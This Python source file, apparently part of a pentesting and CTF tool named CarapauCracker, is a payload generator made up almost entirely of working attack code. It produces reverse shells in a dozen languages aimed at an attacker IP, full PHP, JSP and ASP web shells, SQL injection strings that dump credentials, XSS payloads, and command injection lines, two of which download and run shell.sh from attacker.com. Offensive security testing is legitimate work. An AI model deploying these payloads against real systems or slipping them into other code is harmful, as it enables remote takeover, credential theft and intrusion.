# payloads.py — CarapauCracker Payload Generator
import base64
import urllib.parse
from typing import List, Dict
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()


class PayloadGenerator:
    """Generate various payloads for pentesting and CTF challenges"""
    
    def __init__(self):
        """Initialize PayloadGenerator"""
        pass
    
    def reverse_shell(self, ip: str, port: int) -> List[Dict[str, str]]:
        """
        Generate reverse shell payloads for various languages/platforms
        
        Args: 
            ip:  Attacker IP address
            port:  Listener port
        
        Returns:
            List of payload dictionaries with 'name' and 'payload' keys
        """
        payloads = [
            {
                "name":  "Bash TCP",
                "payload": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
            },
            {
                "name": "Bash UDP",
                "payload": f"bash -i >& /dev/udp/{ip}/{port} 0>&1"
            },
            {
                "name": "Netcat (nc)",
                "payload": f"nc -e /bin/bash {ip} {port}"
            },
            {
                "name": "Netcat (mkfifo)",
                "payload": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
            },
            {
                "name": "Python",
                "payload": f"python -c 'import socket,subprocess,os;s=socket. socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os. dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
            },
            {
                "name": "Python3",
                "payload": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s. fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
            },
            {
                "name": "PHP",
                "payload": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
            },
            {
                "name": "Perl",
                "payload": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
            },
            {
                "name": "Ruby",
                "payload": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
            },
            {
                "name":  "Socat",
                "payload": f"socat TCP:{ip}:{port} EXEC: '/bin/bash',pty,stderr,setsid,sigint,sane"
            },
            {
                "name": "PowerShell",
                "payload":  f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0.. 65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System. Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
            },
            {
                "name":  "Java",
                "payload":  f"r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);p.waitFor();"
            }
        ]
        return payloads
    
    def web_shell(self, ip: str, port: int, lang: str = "php") -> str:
        """
        Generate web shell code
        
        Args:
            ip: Not used for web shells
            port: Not used for web shells
            lang:  Language (php, jsp, asp)
        
        Returns:
            Web shell code as string
        """
        if lang. lower() == "php":
            return """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Web Shell</title>
</head>
<body>
    <form method="GET">
        <input type="text" name="cmd" placeholder="Enter command" size="50">
        <input type="submit" value="Execute">
    </form>
</body>
</html>"""
        
        elif lang.lower() == "jsp":
            return """<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    out.println("<pre>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
    out.println("</pre>");
}
%>"""
        
        elif lang.lower() == "asp":
            return """<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>
<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
</BODY>
</HTML>"""
        
        else:
            return "# Unsupported language.  Use: php, jsp, or asp"
    
    def sql_injection(self, technique: str = "union") -> List[str]:
        """
        Generate SQL injection payloads
        
        Args:
            technique: Type of SQLi (union, boolean, time, error)
        
        Returns:
            List of SQL injection payloads
        """
        if technique. lower() == "union":
            return [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT version(),database(),user()--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,NULL FROM information_schema. columns--",
                "' UNION SELECT username,password FROM users--",
                "-1' UNION SELECT NULL,NULL,NULL--",
                "1' ORDER BY 1--",
                "1' ORDER BY 2--",
                "1' ORDER BY 3--",
                "1' ORDER BY 4--",
            ]
        
        elif technique. lower() == "boolean":
            return [
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR 1=1--",
                "admin' OR '1'='1",
                "admin' OR '1'='1'--",
                "admin' OR 1=1--",
                "' OR 'a'='a",
                "') OR ('1'='1",
                "') OR ('1'='1')--",
                "' OR EXISTS(SELECT * FROM users)--",
            ]
        
        elif technique. lower() == "time":
            return [
                "'; WAITFOR DELAY '00:00:05'--",
                "'; SELECT SLEEP(5)--",
                "'; SELECT pg_sleep(5)--",
                "1' AND SLEEP(5)--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "1' WAITFOR DELAY '0:0:5'--",
                "1'; IF (1=1) WAITFOR DELAY '0:0:5'--",
            ]
        
        elif technique. lower() == "error":
            return [
                "' AND 1=CONVERT(int, (SELECT @@version))--",
                "' AND 1=CONVERT(int, (SELECT user))--",
                "' AND extractvalue(1,concat(0x7e,version()))--",
                "' AND updatexml(null,concat(0x7e,version()),null)--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--",
            ]
        
        else: 
            return ["' OR 1=1--", "admin' --", "' OR '1'='1'--"]
    
    def xss_payloads(self, context: str = "html") -> List[str]:
        """
        Generate XSS payloads
        
        Args:
            context: Context where XSS is injected (html, attribute, script)
        
        Returns:
            List of XSS payloads
        """
        if context.lower() == "html":
            return [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<marquee onstart=alert('XSS')>",
                "<div onpointerover=alert('XSS')>HOVER ME</div>",
            ]
        
        elif context. lower() == "attribute":
            return [
                "' onmouseover='alert(1)",
                "\" onmouseover=\"alert(1)",
                "' onfocus='alert(1)' autofocus='",
                "\" onfocus=\"alert(1)\" autofocus=\"",
                "' onclick='alert(1)",
                "\" onclick=\"alert(1)",
                "javascript:alert(1)",
                "' onerror='alert(1)",
            ]
        
        elif context. lower() == "script":
            return [
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "</script><script>alert('XSS')</script>",
                "'-alert(1)-'",
                "\"-alert(1)-\"",
                "';alert(String.fromCharCode(88,83,83));//",
            ]
        
        else:
            return [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
            ]
    
    def command_injection(self) -> List[str]:
        """
        Generate command injection payloads
        
        Returns:
            List of command injection payloads
        """
        return [
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "|| ls",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "; whoami",
            "| whoami",
            "$(whoami)",
            "`whoami`",
            "; id",
            "; uname -a",
            "; pwd",
            "\n ls",
            "\n cat /etc/passwd",
            "; curl http://attacker.com/shell.sh | bash",
            "; wget http://attacker.com/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh",
        ]
    
    def encode_payload(self, data: str, encoding: str = "base64") -> str:
        """
        Encode payload in various formats
        
        Args:
            data: Data to encode
            encoding: Encoding type (base64, url, hex, unicode)
        
        Returns:
            Encoded string
        """
        if encoding. lower() == "base64":
            return base64.b64encode(data.encode()).decode()
        
        elif encoding.lower() == "url":
            return urllib.parse.quote(data)
        
        elif encoding.lower() == "hex":
            return data.encode().hex()
        
        elif encoding.lower() == "unicode":
            return ''.join([f'\\u{ord(c):04x}' for c in data])
        
        else:
            return data
    
    def display_payloads(self, payloads: List[Dict[str, str]], title: str = "Payloads"):
        """
        Display payloads in a formatted table
        
        Args:
            payloads: List of payload dictionaries with 'name' and 'payload' keys
            title: Table title
        """
        table = Table(title=title, show_header=True, header_style="bold magenta")
        table.add_column("Name", style="cyan", width=20)
        table.add_column("Payload", style="white", width=80)
        
        for p in payloads:
            table.add_row(p['name'], p['payload'])
        
        console.print("\n")
        console.print(table)
        console.print("\n")